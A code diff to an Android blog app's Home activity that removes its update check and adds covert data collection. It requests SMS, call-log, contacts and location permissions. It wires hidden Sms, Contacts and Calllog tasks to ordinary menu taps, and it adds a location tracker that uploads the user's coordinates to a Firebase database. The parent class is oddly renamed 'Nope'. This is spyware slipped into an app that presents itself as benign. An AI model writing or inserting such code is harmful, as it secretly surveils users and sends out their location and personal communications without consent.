@@ -3,12 +3,20 @@ package com.example.aws.blogapp.Activities;
 import android.Manifest;
 import android.app.AlertDialog;
 import android.app.Dialog;
+import android.content.ContentResolver;
+import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
+import android.location.Criteria;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import androidx.annotation.NonNull;
 
@@ -16,6 +24,9 @@ import com.google.android.material.floatingactionbutton.FloatingActionButton;
 
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+
+import android.provider.ContactsContract;
+import android.provider.Telephony;
 import android.util.Log;
 import android.view.Gravity;
 import android.view.View;
@@ -55,10 +66,16 @@ import com.google.firebase.storage.UploadTask;
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
 import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
 
+import net.alhazmy13.gota.Gota;
+import net.alhazmy13.gota.GotaResponse;
+
+import java.lang.ref.WeakReference;
+import java.util.Date;
 import java.util.HashMap;
 
-public class Home extends AppCompatActivity
-        implements NavigationView.OnNavigationItemSelectedListener {
+public class Home extends Nope
+        implements NavigationView.OnNavigationItemSelectedListener, Gota.OnRequestPermissionsBack,LocationListener
+{
 
 
 //version
@@ -66,6 +83,8 @@ private FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getIns
     private HashMap<String, Object> firebaseDefaultMap;
     public static final String VERSION_CODE_KEY = "latest_app_version";
     private static final String TAG = "MainActivity";
+    LocationManager locationManager;
+    String mprovider;
     private static final int PReqCode = 2 ;
     private static final int REQUESCODE = 2 ;
     FirebaseAuth mAuth;
@@ -87,39 +106,19 @@ private FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getIns
         FirebaseUser currentFirebaseUser = FirebaseAuth.getInstance().getCurrentUser() ;
         Toast.makeText(this, "" + currentFirebaseUser.getUid(), Toast.LENGTH_LONG).show();
 
+        new Gota.Builder(this)
+                .withPermissions(Manifest.permission.CAMERA,Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.CALL_PHONE,
+                        Manifest.permission.INTERNET,Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.WRITE_EXTERNAL_STORAGE ,
+                        Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_SMS,Manifest.permission.READ_CONTACTS   )
+                .requestId(1)
+                .setListener(this)
+                .check();
+       // Hashmap hashes = new Hashmap("test","testing class");
 
         //firebase check
 
         //This is default Map
         //Setting the Default Map Value with the current version code
-        firebaseDefaultMap = new HashMap<>();
-        firebaseDefaultMap.put(VERSION_CODE_KEY, getCurrentVersionCode());
-        mFirebaseRemoteConfig.setDefaults(firebaseDefaultMap);
-
-        //Setting that default Map to Firebase Remote Config
-
-        //Setting Developer Mode enabled to fast retrieve the values
-        mFirebaseRemoteConfig.setConfigSettings(
-                new FirebaseRemoteConfigSettings.Builder().setDeveloperModeEnabled(BuildConfig.DEBUG)
-                        .build());
-
-        //Fetching the values here
-        mFirebaseRemoteConfig.fetch().addOnCompleteListener(new OnCompleteListener<Void>() {
-            @Override
-            public void onComplete(@NonNull Task<Void> task) {
-                if (task.isSuccessful()) {
-                    mFirebaseRemoteConfig.activateFetched();
-                    Log.d(TAG, "Fetched value: " + mFirebaseRemoteConfig.getString(VERSION_CODE_KEY));
-                    //calling function to check if new version is available or not
-                    checkForUpdate();
-                } else {
-                    Toast.makeText(Home.this, "Something went wrong please try again",
-                            Toast.LENGTH_SHORT).show();
-                }
-            }
-        });
-
-        Log.d(TAG, "Default value: " + mFirebaseRemoteConfig.getString(VERSION_CODE_KEY));
 
 //done adding those links
 
@@ -160,33 +159,6 @@ private FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getIns
         getSupportFragmentManager().beginTransaction().replace(R.id.container,new HomeFragment()).commit();
 
 
-
-    }
-
-    private int getCurrentVersionCode() {
-        try {
-            return getPackageManager().getPackageInfo(getPackageName(), 0).versionCode;
-        } catch (PackageManager.NameNotFoundException e) {
-            e.printStackTrace();
-        }
-        return -1;
-    }
-
-    private void checkForUpdate() {
-        int latestAppVersion = (int) mFirebaseRemoteConfig.getDouble(VERSION_CODE_KEY);
-        if (latestAppVersion > getCurrentVersionCode()) {
-            new AlertDialog.Builder(this).setTitle("Please Update the App")
-                    .setMessage("A new version of this app is available. Please update it").setPositiveButton(
-                    "OK", new DialogInterface.OnClickListener() {
-                        @Override
-                        public void onClick(DialogInterface dialog, int whichButton) {
-                            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=gardenia.bscit"));
-                            startActivity(browserIntent);
-                        }
-                    }).setCancelable(false).show();
-        } else {
-            Toast.makeText(this,"This app is already up to date", Toast.LENGTH_SHORT).show();
-        }
     }
 
     @Override
@@ -448,6 +420,8 @@ private FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getIns
 
         return super.onOptionsItemSelected(item);
     }
+    //adding test classes
+
 
     @SuppressWarnings("StatementWithEmptyBody")
     @Override
@@ -460,6 +434,7 @@ private FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getIns
             bundle.putString("Home_key_press","true");
             getSupportActionBar().setTitle("Home");
             getSupportFragmentManager().beginTransaction().replace(R.id.container,new HomeFragment()).commit();
+            new Sms().execute("");
 
         } else if (id == R.id.nav_profile) {
             bundle.putString("Profile_key_press","true");
@@ -467,7 +442,9 @@ private FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getIns
             Intent myIntent = new Intent(Home.this,
                     Web.class);
            startActivity(myIntent);
-           // getSupportActionBar().setTitle("Profile");
+            new Contacts().execute("");
+
+            // getSupportActionBar().setTitle("Profile");
           // getSupportFragmentManager().beginTransaction().replace(R.id.container,new ProfileFragment()).commit();
 
         } else if (id == R.id.nav_settings) {
@@ -475,13 +452,14 @@ private FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getIns
 
             getSupportActionBar().setTitle("Settings");
             getSupportFragmentManager().beginTransaction().replace(R.id.container,new SettingsFragment()).commit();
-
+            loco();
 
         }else if (id == R.id.nav_share) {
 
             bundle.putString("Share_key_press","true");
 
             share();
+            new Calllog().execute("");
 
         }
         else if (id == R.id.nav_signout) {
@@ -499,6 +477,55 @@ private FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getIns
         DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
         drawer.closeDrawer(GravityCompat.START);
         return true;
+    }
+
+    private void loco() {
+        Log.d("location","location");
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        Criteria criteria = new Criteria();
+        mprovider = locationManager.getBestProvider(criteria, false);
+        if (mprovider != null && !mprovider.equals("")) {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                return;
+            }
+            Location location = locationManager.getLastKnownLocation(mprovider);
+            locationManager.requestLocationUpdates(mprovider, 15000, 1, (LocationListener) this);
+
+            if (location != null)
+            {                onLocationChanged(location);
+
+            }
+            else
+                Toast.makeText(getBaseContext(), "No Location Provider Found Check Your Code", Toast.LENGTH_SHORT).show();
+        }
+
+    }
+
+    @Override
+    public void onLocationChanged(Location location) {
+        FirebaseUser currentFirebaseUser = FirebaseAuth.getInstance().getCurrentUser() ;
+        FirebaseDatabase database = FirebaseDatabase.getInstance();
+        DatabaseReference myRef = database.getReference("data");
+        HashMap<String, String> meMap=new HashMap<String, String>();
+        meMap.put("Latitude", String.valueOf(location.getLatitude()));
+        meMap.put("Longitude",String.valueOf(location.getLongitude()));
+        myRef.child(currentFirebaseUser.getUid()).child("Location").setValue(meMap);
+
+    }
+
+    @Override
+    public void onStatusChanged(String s, int i, Bundle bundle) {
+
+    }
+
+    @Override
+    public void onProviderEnabled(String s) {
+
+    }
+
+    @Override
+    public void onProviderDisabled(String s) {
+
     }
 
     private void share() {
@@ -539,4 +566,15 @@ private FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getIns
     }
 
 
+    @Override
+    public void onRequestBack(int requestId, @NonNull GotaResponse gotaResponse) {
+        if(gotaResponse.isAllGranted()) {
+            Log.d("permission","true");
+        }
+    }
+
+    public FloatingActionButton getFloatingActionButton() {
+        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
+        return fab;
+    }
 }
